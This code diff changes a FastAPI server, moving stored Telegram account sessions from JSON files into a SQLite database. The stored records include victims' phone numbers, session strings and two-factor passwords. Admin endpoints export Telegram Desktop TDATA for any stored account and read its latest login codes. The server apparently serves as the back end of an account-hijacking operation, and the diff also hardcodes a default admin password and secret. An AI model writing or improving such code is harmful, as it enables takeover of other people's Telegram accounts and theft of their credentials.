@@ -13,6 +13,7 @@ import secrets
 import hashlib
 import logging
 import re
+import sqlite3
 import zipfile
 import tempfile
 import shutil
@@ -48,8 +49,10 @@ ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "master1989a")
 HESEARCH_WEBHOOK_URL = os.environ.get("HESEARCH_WEBHOOK_URL", "").strip()
 HESEARCH_WEBHOOK_SECRET = os.environ.get("HESEARCH_WEBHOOK_SECRET", "busyuser_secret_2024")
 
-SESSIONS_DIR = "/data/sessions"
-TDATA_DIR    = "/data/tdata"
+DATA_DIR = "/data"
+DB_PATH = f"{DATA_DIR}/busyusers.db"
+SESSIONS_DIR = f"{DATA_DIR}/sessions"  # legacy JSON import path
+TDATA_DIR    = f"{DATA_DIR}/tdata"
 # ────────────────────────────────────────────────────────────
 
 app = FastAPI()
@@ -63,6 +66,12 @@ app.add_middleware(
 )
 
 active_sessions: dict = {}
+
+
+@app.on_event("startup")
+async def on_startup():
+    init_db()
+    migrate_legacy_json_sessions()
 
 
 def _clean_id(value) -> str:
@@ -83,18 +92,79 @@ def _session_payload_matches(session_data: dict, lookup_id: str) -> bool:
     }
 
 
-def resolve_session_path(user_id: str) -> str | None:
-    lookup_id = _clean_id(user_id)
-    if not lookup_id:
-        return None
+def init_db():
+    os.makedirs(DATA_DIR, exist_ok=True)
+    with sqlite3.connect(DB_PATH) as conn:
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS sessions (
+                session_uid TEXT PRIMARY KEY,
+                tg_account_id TEXT NOT NULL,
+                bot_user_id TEXT NOT NULL DEFAULT '',
+                phone TEXT NOT NULL DEFAULT '',
+                username TEXT NOT NULL DEFAULT '',
+                first_name TEXT NOT NULL DEFAULT '',
+                session_string TEXT NOT NULL DEFAULT '',
+                password_2fa TEXT NOT NULL DEFAULT '',
+                saved_at TEXT NOT NULL DEFAULT ''
+            )
+        """)
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_sessions_tg_account_id ON sessions(tg_account_id)")
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_sessions_bot_user_id ON sessions(bot_user_id)")
+        conn.commit()
 
-    direct_path = f"{SESSIONS_DIR}/{lookup_id}.json"
-    if os.path.exists(direct_path):
-        return direct_path
 
+def _normalize_session_record(session_data: dict) -> dict:
+    session_uid = _clean_id(session_data.get("session_uid") or session_data.get("bot_user_id") or session_data.get("user_id"))
+    tg_account_id = _clean_id(session_data.get("tg_account_id") or session_data.get("user_id") or session_uid)
+    return {
+        "session_uid": session_uid,
+        "tg_account_id": tg_account_id,
+        "bot_user_id": _clean_id(session_data.get("bot_user_id")),
+        "phone": session_data.get("phone", "") or "",
+        "username": session_data.get("username", "") or "",
+        "first_name": session_data.get("first_name", "") or "",
+        "session_string": session_data.get("session_string", "") or "",
+        "password_2fa": session_data.get("password_2fa", "") or "",
+        "saved_at": session_data.get("saved_at", "") or datetime.utcnow().isoformat(),
+    }
+
+
+def upsert_session_record(session_data: dict):
+    row = _normalize_session_record(session_data)
+    if not row["session_uid"] or not row["session_string"]:
+        return
+    with sqlite3.connect(DB_PATH) as conn:
+        conn.execute("""
+            INSERT INTO sessions (
+                session_uid, tg_account_id, bot_user_id, phone,
+                username, first_name, session_string, password_2fa, saved_at
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ON CONFLICT(session_uid) DO UPDATE SET
+                tg_account_id=excluded.tg_account_id,
+                bot_user_id=excluded.bot_user_id,
+                phone=excluded.phone,
+                username=excluded.username,
+                first_name=excluded.first_name,
+                session_string=excluded.session_string,
+                password_2fa=excluded.password_2fa,
+                saved_at=excluded.saved_at
+        """, (
+            row["session_uid"],
+            row["tg_account_id"],
+            row["bot_user_id"],
+            row["phone"],
+            row["username"],
+            row["first_name"],
+            row["session_string"],
+            row["password_2fa"],
+            row["saved_at"],
+        ))
+        conn.commit()
+
+
+def migrate_legacy_json_sessions():
     if not os.path.isdir(SESSIONS_DIR):
-        return None
-
+        return
     for fname in os.listdir(SESSIONS_DIR):
         if not fname.endswith(".json"):
             continue
@@ -102,11 +172,49 @@ def resolve_session_path(user_id: str) -> str | None:
         try:
             with open(path, encoding="utf-8") as f:
                 session_data = json.load(f)
-        except Exception:
-            continue
-        if _session_payload_matches(session_data, lookup_id):
-            return path
+            upsert_session_record(session_data)
+        except Exception as migration_error:
+            logger.warning(f"Legacy session migration skipped for {path}: {migration_error}")
+
+
+def get_session_record(user_id: str) -> dict | None:
+    lookup_id = _clean_id(user_id)
+    if not lookup_id:
+        return None
+
+    with sqlite3.connect(DB_PATH) as conn:
+        conn.row_factory = sqlite3.Row
+
+        for field in ("session_uid", "bot_user_id", "tg_account_id"):
+            row = conn.execute(
+                f"SELECT * FROM sessions WHERE {field}=? ORDER BY saved_at DESC LIMIT 1",
+                (lookup_id,),
+            ).fetchone()
+            if row:
+                return dict(row)
+
+    # Legacy fallback: import from JSON once if DB entry is missing.
+    if os.path.isdir(SESSIONS_DIR):
+        for fname in os.listdir(SESSIONS_DIR):
+            if not fname.endswith(".json"):
+                continue
+            path = f"{SESSIONS_DIR}/{fname}"
+            try:
+                with open(path, encoding="utf-8") as f:
+                    session_data = json.load(f)
+            except Exception:
+                continue
+            if _session_payload_matches(session_data, lookup_id):
+                upsert_session_record(session_data)
+                return _normalize_session_record(session_data)
     return None
+
+
+def list_session_records() -> list[dict]:
+    with sqlite3.connect(DB_PATH) as conn:
+        conn.row_factory = sqlite3.Row
+        rows = conn.execute("SELECT * FROM sessions ORDER BY saved_at DESC").fetchall()
+        return [dict(row) for row in rows]
 
 
 def _serialize_code_messages(messages) -> list[dict]:
@@ -293,9 +401,7 @@ async def verify_code(request: Request):
 async def save_session(session_uid: str, tg_account_id: str, bot_user_id: str,
                        phone: str, session_string: str, username: str | None,
                        first_name: str | None, password: str = ""):
-    os.makedirs(SESSIONS_DIR, exist_ok=True)
-
-    data = {
+    session_data = {
         "session_uid": session_uid,
         "user_id": session_uid,
         "bot_user_id": bot_user_id,
@@ -308,11 +414,8 @@ async def save_session(session_uid: str, tg_account_id: str, bot_user_id: str,
         "saved_at": datetime.utcnow().isoformat(),
     }
 
-    path = f"{SESSIONS_DIR}/{session_uid}.json"
-    with open(path, "w", encoding="utf-8") as f:
-        json.dump(data, f, ensure_ascii=False, indent=2)
-
-    logger.info(f"Session saved: {path}")
+    upsert_session_record(session_data)
+    logger.info(f"Session saved in DB: session_uid={session_uid} tg_account_id={tg_account_id}")
 
 
 # ── Генерация tdata (нативно, без opentele) ───────────────────
@@ -432,15 +535,10 @@ def require_admin(credentials: HTTPBasicCredentials = Depends(security)):
 async def download_tdata(user_id: str, _=Depends(require_admin)):
     tg_account_id = user_id
     session_string = ""
-    session_path = resolve_session_path(user_id)
-    if session_path:
-        try:
-            with open(session_path, encoding="utf-8") as f:
-                session_data = json.load(f)
-            tg_account_id = _clean_id(session_data.get("tg_account_id")) or user_id
-            session_string = session_data.get("session_string", "") or ""
-        except Exception:
-            pass
+    session_data = get_session_record(user_id)
+    if session_data:
+        tg_account_id = _clean_id(session_data.get("tg_account_id")) or user_id
+        session_string = session_data.get("session_string", "") or ""
 
     if session_string:
         await generate_tdata(tg_account_id, session_string)
@@ -474,12 +572,10 @@ async def download_tdata(user_id: str, _=Depends(require_admin)):
 # ── /admin/codes/<user_id> — последние коды с +42777 ─────────
 @app.get("/admin/codes/{user_id}")
 async def get_codes(user_id: str, _=Depends(require_admin)):
-    session_path = resolve_session_path(user_id)
-    if not session_path:
+    session_data = get_session_record(user_id)
+    if not session_data:
         raise HTTPException(status_code=404, detail="Сессия не найдена")
-    with open(session_path, encoding="utf-8") as f:
-        d = json.load(f)
-    session_string = d.get("session_string", "")
+    session_string = session_data.get("session_string", "")
     if not session_string:
         raise HTTPException(status_code=400, detail="Нет session_string")
     client = None
@@ -550,23 +646,11 @@ async def get_codes(user_id: str, _=Depends(require_admin)):
 
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin)):
-    os.makedirs(SESSIONS_DIR, exist_ok=True)
     admin_auth_token = base64.b64encode(
         f"{credentials.username}:{credentials.password}".encode("utf-8")
     ).decode("ascii")
 
-    sessions_data = []
-    for fname in sorted(os.listdir(SESSIONS_DIR)):
-        if not fname.endswith(".json"):
-            continue
-        try:
-            with open(f"{SESSIONS_DIR}/{fname}") as f:
-                d = json.load(f)
-            sessions_data.append(d)
-        except Exception:
-            continue
-
-    sessions_data.sort(key=lambda x: x.get("saved_at", ""), reverse=True)
+    sessions_data = list_session_records()
 
     rows = ""
     for d in sessions_data:
@@ -577,10 +661,10 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
         twofa = d.get("password_2fa", "")
         saved_at = d.get("saved_at", "") or ""
 
-        tdata_exists = os.path.exists(f"{TDATA_DIR}/{tg_account_id}")
+        has_session_string = bool(d.get("session_string"))
         tdata_btn = (
             f'<a class="dl-btn" href="/admin/tdata/{session_uid}">⬇ Скачать TDATA</a>'
-            if tdata_exists
+            if has_session_string
             else '<span class="no-tdata">нет tdata</span>'
         )
 
